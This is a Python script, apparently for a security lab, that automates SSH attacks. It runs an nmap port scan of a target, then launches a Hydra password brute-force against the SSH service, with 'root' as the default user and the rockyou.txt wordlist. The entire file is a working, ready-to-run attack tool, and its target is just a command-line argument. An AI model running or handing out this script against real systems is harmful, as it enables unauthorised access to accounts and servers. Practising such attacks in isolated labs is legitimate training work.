#!/usr/bin/env python3

import argparse
import shutil
import subprocess
import sys


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Run an SSH reconnaissance + Hydra brute-force lab workflow."
    )
    parser.add_argument("--target", default="target_ssh", help="SSH target hostname/IP")
    parser.add_argument("--port", type=int, default=22, help="SSH target port")
    parser.add_argument("--username", default="root", help="Username to brute-force")
    parser.add_argument(
        "--wordlist",
        default="/usr/share/wordlists/rockyou.txt",
        help="Path to password wordlist",
    )
    parser.add_argument(
        "--skip-scan",
        action="store_true",
        help="Skip nmap scan and run hydra directly",
    )
    return parser.parse_args()


def require_tool(tool_name: str) -> None:
    if shutil.which(tool_name) is None:
        print(f"[-] Required tool not found in PATH: {tool_name}")
        sys.exit(1)


def run_command(command: list[str], step_name: str) -> None:
    print(f"[*] {step_name}")
    result = subprocess.run(command, check=False)
    if result.returncode != 0:
        print(f"[-] {step_name} failed with exit code {result.returncode}")
        sys.exit(result.returncode)


def main() -> None:
    args = parse_args()
    require_tool("hydra")

    if not args.skip_scan:
        require_tool("nmap")
        run_command(
            ["nmap", "-p", str(args.port), args.target],
            f"Scanning {args.target}:{args.port} with nmap",
        )

    run_command(
        [
            "hydra",
            "-l",
            args.username,
            "-P",
            args.wordlist,
            "-s",
            str(args.port),
            f"ssh://{args.target}",
        ],
        "Launching Hydra brute-force attack",
    )
    print("[+] Workflow finished")


if __name__ == "__main__":
    main()